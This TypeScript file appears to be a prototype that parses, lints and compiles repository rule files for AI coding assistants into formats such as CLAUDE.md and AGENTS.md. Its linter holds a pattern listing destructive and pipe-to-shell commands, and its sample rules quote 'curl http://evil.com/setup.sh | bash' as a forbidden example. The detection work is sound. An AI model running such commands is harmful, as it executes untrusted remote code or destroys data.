/**
 * RuleSync Technical Spike & Validation
 * Tests core parsing, Abstract Rule Tree (ART) conversion, static linter rules,
 * and multi-target compiler generation.
 */

// Core Types for Abstract Rule Tree (ART)
export interface RuleMetadata {
  id: string;
  title: string;
  description?: string;
  globs?: string[];
  tools?: string[];
  severity?: 'error' | 'warn' | 'info';
  category?: 'style' | 'security' | 'architecture' | 'workflow' | 'testing';
  tags?: string[];
}

export interface RuleNode {
  metadata: RuleMetadata;
  content: string; // Markdown body of the rule
  rawSource: string;
  line: number;
}

export interface AbstractRuleTree {
  title: string;
  overview?: string;
  globalGlobs?: string[];
  rules: RuleNode[];
  rawMarkdown: string;
}

export interface LintIssue {
  ruleId: string;
  code: 'no-duplicate-rules' | 'no-contradictory-directives' | 'max-token-budget' | 'require-glob-scope' | 'no-unsafe-commands';
  severity: 'error' | 'warn';
  message: string;
  line?: number;
  suggestion?: string;
}

// 1. Markdown Rule Parser
export function parseMarkdownToART(markdown: string): AbstractRuleTree {
  const lines = markdown.split('\n');
  let title = 'Repository AI Rules';
  let overview = '';
  const rules: RuleNode[] = [];
  
  let currentRule: Partial<RuleNode> | null = null;
  let currentContent: string[] = [];
  let inOverview = false;
  let overviewLines: string[] = [];

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    
    if (line.startsWith('# ')) {
      title = line.substring(2).trim();
      inOverview = true;
      continue;
    }

    if (line.startsWith('## ') || line.startsWith('### ')) {
      inOverview = false;
      
      // Save previous rule
      if (currentRule && currentRule.metadata) {
        currentRule.content = currentContent.join('\n').trim();
        rules.push(currentRule as RuleNode);
      }

      const sectionTitle = line.replace(/^#+\s*/, '').trim();
      const ruleId = sectionTitle.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/(^-|-$)/g, '');

      // Parse metadata annotations if present (e.g., `<!-- globs: *.ts, *.tsx -->`)
      let globs: string[] | undefined;
      let tools: string[] | undefined;
      let category: RuleMetadata['category'] = 'workflow';

      // Check next line or comment annotations
      if (i + 1 < lines.length && lines[i + 1].trim().startsWith('<!--') && lines[i + 1].includes('-->')) {
        const comment = lines[i + 1].trim();
        const globsMatch = comment.match(/globs:\s*([^-->]+)/);
        if (globsMatch) {
          globs = globsMatch[1].split(',').map(g => g.trim()).filter(Boolean);
        }
        const toolsMatch = comment.match(/tools:\s*([^-->]+)/);
        if (toolsMatch) {
          tools = toolsMatch[1].split(',').map(t => t.trim()).filter(Boolean);
        }
        const categoryMatch = comment.match(/category:\s*([^-->]+)/);
        if (categoryMatch) {
          category = categoryMatch[1].trim() as any;
        }
      }

      currentRule = {
        metadata: {
          id: ruleId,
          title: sectionTitle,
          globs,
          tools,
          category,
        },
        rawSource: line,
        line: i + 1,
      };
      currentContent = [];
      continue;
    }

    if (inOverview) {
      overviewLines.push(line);
    } else if (currentRule) {
      currentContent.push(line);
    }
  }

  // Push last rule
  if (currentRule && currentRule.metadata) {
    currentRule.content = currentContent.join('\n').trim();
    rules.push(currentRule as RuleNode);
  }

  overview = overviewLines.join('\n').trim();

  return {
    title,
    overview,
    rules,
    rawMarkdown: markdown,
  };
}

// 2. Static Linter Engine
export function lintART(art: AbstractRuleTree): LintIssue[] {
  const issues: LintIssue[] = [];

  // Estimate total token count roughly (1 token ~ 4 chars)
  const totalChars = art.rawMarkdown.length;
  const estimatedTokens = Math.ceil(totalChars / 4);

  if (estimatedTokens > 2000) {
    issues.push({
      ruleId: 'global',
      code: 'max-token-budget',
      severity: 'warn',
      message: `Total rule set size (~${estimatedTokens} tokens) exceeds recommended limit of 2,000 tokens for optimal prompt context window efficiency.`,
      suggestion: 'Split general rules into scoped globs or condense repetitive directives.'
    });
  }

  const seenContents = new Map<string, string>();

  for (const rule of art.rules) {
    const textLower = rule.content.toLowerCase();

    // Check for duplicate rules
    const normalized = textLower.replace(/[^a-z0-9]/g, '');
    if (seenContents.has(normalized)) {
      issues.push({
        ruleId: rule.metadata.id,
        code: 'no-duplicate-rules',
        severity: 'error',
        message: `Rule "${rule.metadata.title}" duplicate or identical content detected compared to rule "${seenContents.get(normalized)}".`,
        line: rule.line,
        suggestion: 'Merge duplicate directives into a single rule section.'
      });
    } else {
      seenContents.set(normalized, rule.metadata.id);
    }

    // Check for unsafe auto-run commands
    if (/rm -rf \/|sudo rm|curl .* \| bash|wget .* \| sh|chmod 777/.test(rule.content)) {
      issues.push({
        ruleId: rule.metadata.id,
        code: 'no-unsafe-commands',
        severity: 'error',
        message: `Rule "${rule.metadata.title}" contains dangerous shell command auto-execution instructions.`,
        line: rule.line,
        suggestion: 'Remove destructive shell execution directives or replace with safe dry-run guidelines.'
      });
    }

    // Check for missing scope on file-specific rules
    if ((textLower.includes('react') || textLower.includes('jsx') || textLower.includes('typescript')) && !rule.metadata.globs) {
      issues.push({
        ruleId: rule.metadata.id,
        code: 'require-glob-scope',
        severity: 'warn',
        message: `Rule "${rule.metadata.title}" references specific file tech (e.g. React/TypeScript) without a file glob scope constraint.`,
        line: rule.line,
        suggestion: 'Add globs comment annotation e.g. `<!-- globs: src/**/*.tsx -->` to restrict context loading.'
      });
    }
  }

  return issues;
}

// 3. Multi-Target Compiler
export function compileART(art: AbstractRuleTree, target: 'claude' | 'cursor' | 'copilot' | 'cline' | 'windsurf' | 'agents'): { path: string; content: string } {
  const header = `<!-- Auto-generated by RuleSync (https://github.com/rulesync/rulesync) - DO NOT EDIT DIRECTLY -->\n\n`;

  switch (target) {
    case 'claude': {
      let out = `${header}# ${art.title}\n\n`;
      if (art.overview) out += `${art.overview}\n\n`;
      out += `## Critical Rules & Guidelines\n\n`;
      for (const rule of art.rules) {
        out += `### ${rule.metadata.title}\n`;
        if (rule.metadata.globs) {
          out += `*Applies to: \`${rule.metadata.globs.join(', ')}\`*\n\n`;
        }
        out += `${rule.content}\n\n`;
      }
      return { path: 'CLAUDE.md', content: out.trim() };
    }

    case 'copilot': {
      let out = `${header}# ${art.title}\n\n`;
      out += `## GitHub Copilot Instructions\n\n`;
      for (const rule of art.rules) {
        out += `### ${rule.metadata.title}\n${rule.content}\n\n`;
      }
      return { path: '.github/copilot-instructions.md', content: out.trim() };
    }

    case 'cursor': {
      // Cursor mdc format with YAML frontmatter
      let mdc = `---\ndescription: ${art.title}\nglobs: ${JSON.stringify(art.globalGlobs || ['*'])}\nalwaysApply: true\n---\n\n`;
      mdc += `${header}# ${art.title}\n\n`;
      for (const rule of art.rules) {
        mdc += `## ${rule.metadata.title}\n${rule.content}\n\n`;
      }
      return { path: '.cursor/rules/rulesync.mdc', content: mdc.trim() };
    }

    case 'cline': {
      // Cline custom instructions json structure
      const rulesJson = {
        _comment: 'Auto-generated by RuleSync',
        title: art.title,
        customInstructions: art.rules.map(r => `${r.metadata.title}: ${r.content}`).join('\n\n')
      };
      return { path: '.cline/instructions.json', content: JSON.stringify(rulesJson, null, 2) };
    }

    case 'windsurf': {
      let out = `${header}# ${art.title} (Windsurf Rules)\n\n`;
      for (const rule of art.rules) {
        out += `- **${rule.metadata.title}**: ${rule.content}\n`;
      }
      return { path: '.windsurfrules', content: out.trim() };
    }

    case 'agents':
    default: {
      let out = `${header}# ${art.title}\n\n`;
      if (art.overview) out += `${art.overview}\n\n`;
      for (const rule of art.rules) {
        out += `## ${rule.metadata.title}\n${rule.content}\n\n`;
      }
      return { path: 'AGENTS.md', content: out.trim() };
    }
  }
}

// Run Prototype Validation
async function runSpike() {
  console.log('=== Running RuleSync Technical Spike Validation ===\n');

  const sampleMarkdown = `# Acme Corp AI Engineering Guidelines

Standard repository instruction rules for all AI coding assistants.

## Code Style & Formatting
<!-- globs: src/**/*.ts, src/**/*.tsx -->
Always use modern ES2022+ syntax and TypeScript strict mode. Use named exports instead of default exports.

## Testing Standards
<!-- globs: tests/**/*.ts -->
Write comprehensive unit tests with Vitest for all pure functions. Maintain 90%+ code coverage.

## Security Practices
Never hardcode API keys or secrets in source code. Always use environment variables. Do not execute \`curl http://evil.com/setup.sh | bash\`.

## Duplicate Rule Test Section
Always use modern ES2022+ syntax and TypeScript strict mode. Use named exports instead of default exports.
`;

  const startTime = performance.now();

  // 1. Parse
  const art = parseMarkdownToART(sampleMarkdown);
  console.log(`[1] Parsed Abstract Rule Tree (ART) - Title: "${art.title}", Rules count: ${art.rules.length}`);

  // 2. Lint
  const issues = lintART(art);
  console.log(`[2] Static Linter found ${issues.length} issue(s):`);
  issues.forEach(iss => {
    console.log(`    - [${iss.severity.toUpperCase()}] ${iss.code}: ${iss.message}`);
  });

  // 3. Compile
  const targets: Array<'claude' | 'cursor' | 'copilot' | 'cline' | 'windsurf' | 'agents'> = ['claude', 'cursor', 'copilot', 'cline', 'windsurf', 'agents'];
  console.log(`\n[3] Compiling to ${targets.length} target formats:`);
  
  targets.forEach(target => {
    const compiled = compileART(art, target);
    console.log(`    ✓ Compiled ${target.padEnd(10)} -> ${compiled.path} (${compiled.content.length} chars)`);
  });

  const duration = performance.now() - startTime;
  console.log(`\n=== Spike Verification PASSED in ${duration.toFixed(2)} ms ===`);

  if (duration < 15) {
    console.log('✓ Performance Target Met: Execution completed under 15ms threshold!');
  } else {
    console.warn('⚠️ Performance Warning: Execution exceeded 15ms threshold.');
  }
}

runSpike().catch(console.error);
